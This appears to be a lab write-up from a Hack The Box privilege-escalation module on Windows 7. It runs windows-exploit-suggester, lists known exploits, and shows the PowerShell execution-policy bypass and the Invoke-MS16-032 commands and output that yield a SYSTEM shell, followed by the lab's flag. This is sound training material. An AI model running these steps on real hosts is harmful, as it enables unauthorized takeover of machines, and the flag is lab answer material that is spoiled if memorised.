---
description: >-
  Windows 7 was made end-of-life on January 14, 2020, but is still in use in
  many environments.
---

# Windows Desktop Versions

<table><thead><tr><th width="396.3333333333333">Feature</th><th width="183">Windows 7</th><th>Windows 10</th></tr></thead><tbody><tr><td><a href="https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/">Microsoft Password (MFA)</a></td><td></td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview">BitLocker</a></td><td>Partial</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">Credential Guard</a></td><td></td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">Remote Credential Guard</a></td><td></td><td>X</td></tr><tr><td><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">Device Guard (code integrity)</a></td><td></td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td><td>Partial</td><td>X</td></tr><tr><td><a href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td><td>Partial</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a></td><td></td><td>X</td></tr></tbody></table>

## Exploit Suggester

```bash
sudo python windows-exploit-suggester.py --update
```

```bash
python windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 

. . .
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
. . .
```

## **MS16-032 -> PowerShell PoC**

{% embed url="https://www.exploit-db.com/exploits/39719" %}
The exploit
{% endembed %}

```powershell-session
PS C:\htb> Set-ExecutionPolicy bypass -scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): A
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y


PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
PS C:\htb> Invoke-MS16-032

         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 6
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1656

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1652
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

## Assessment

Enumerate the target host and escalate privileges to SYSTEM. Submit the contents of the flag on the Administrator Desktop.

<details>

<summary>Exploit Enumeration</summary>

```
python3 windows-exploit-suggester.py --database 2023-07-19-mssb.xls --systeminfo systeminfo.txt
[*]initiating winsploit version 3.3...
[*]database file detected as xls or xlsx based on extension
[*]attempting to read from the systeminfo input file
[+]systeminfo input file read successfully (utf-8)
[*]querying database file for potential vulnerabilities
[*]comparing the 3 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits
[*]there are now 386 remaining vulns
[+][E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+]windows version identified as 'Windows 7 SP1 64-bit'
[*]
[E]MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]  https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]  https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]  https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]
[E]MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]  https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]
[M]MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]  https://github.com/foxglovesec/RottenPotato
[*]  https://github.com/Kevin-Robertson/Tater
[*]  https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]  https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]
[E]MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]  https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]  https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]
[E]MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]  https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*]
[E]MS16-059: Security Update for Windows Media Center (3150220) - Important
[*]  https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC
[*]
[E]MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]  https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
[*]  http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
[*]
[E]MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]  https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]  https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]  https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]  https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]
[M]MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]  https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]  https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]  https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*]
[E]MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]  Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]
[E]MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]  https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]  https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*]
[E]MS15-134: Security Update for Windows Media Center to Address Remote Code Execution (3108669) - Important
[*]  https://www.exploit-db.com/exploits/38911/ -- Microsoft Windows Media Center Library Parsing RCE Vulnerability aka self-executing' MCL File, PoC
[*]  https://www.exploit-db.com/exploits/38912/ -- Microsoft Windows Media Center Link File Incorrectly Resolved Reference, PoC
[*]  https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object - 'els.dll' DLL Planting (MS15-134)
[*]  https://code.google.com/p/google-security-research/issues/detail?id=514 -- Microsoft Office / COM Object DLL Planting with els.dll
[*]
[E]MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]  https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]  https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*]
[E]MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]  https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*]
[E]MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]  https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*]
[E]MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]  https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]  https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]  https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*]
[M]MS15-100: Vulnerability in Windows Media Center Could Allow Remote Code Execution (3087918) - Important
[*]  https://www.exploit-db.com/exploits/38195/ -- MS15-100 Microsoft Windows Media Center MCL Vulnerability, MSF
[*]  https://www.exploit-db.com/exploits/38151/ -- Windows Media Center - Command Execution (MS15-100), PoC
[*]
[E]MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]  https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]  https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*]
[M]MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]  https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*]
[M]MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]  https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]  https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*]
[E]MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]  https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]  https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]  https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*]
[E]MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[*]  http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
[*]
[E]MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]  http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*]
[M]MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]  https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]  http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]  http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]  http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]  http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]  http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M]MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]  http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]  http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M]MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]  http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*]
[E]MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]  https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]  https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*]
[E]MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E]MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]  http://www.exploit-db.com/exploits/34458/
[*]
[E]MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]  http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*]
[M]MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M]MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E]MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M]MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M]MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M]MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M]MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M]MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M]MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M]MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M]MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M]MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E]MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]  http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]  http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*]
[*]done
```

</details>

<details>

<summary>SetExecution and Exploit</summary>

```
PS C:\Users\htb-student> Set-ExecutionPolicy bypass -scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y
PS C:\Users\htb-student\Desktop> Import-Module .\Invoke-MS16-032.ps1
PS C:\Users\htb-student\Desktop> Invoke-MS16-032
         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 6
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2304

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2384
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

![](<../../../.gitbook/assets/image (123) (1).png>)

Cm0n\_l3ts\_upgRade\_t0\_win10!

</details>
